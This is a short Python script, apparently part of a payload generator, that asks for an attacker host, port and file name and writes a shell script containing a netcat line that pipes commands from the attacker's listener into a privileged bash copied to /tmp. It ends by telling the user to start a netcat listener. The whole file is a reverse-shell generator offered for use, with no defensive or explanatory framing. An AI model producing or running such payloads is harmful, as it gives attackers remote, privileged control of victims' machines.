import os
import time

os.chdir("../output/")
time.sleep(0.5)
opt = input("LHOST: ")
opt2 = input("LPORT: ")
opt3 = input("name: ")
op = open(opt3 + ".sh", "w")
cod = "nc {} {} | /tmp/bash -p  | echo".format(opt, opt2)
op1 = op.write(cod)
op.close()
time.sleep(0.1)
print("WARNING: you need necat to connect using nc -lvnp <PORT>")
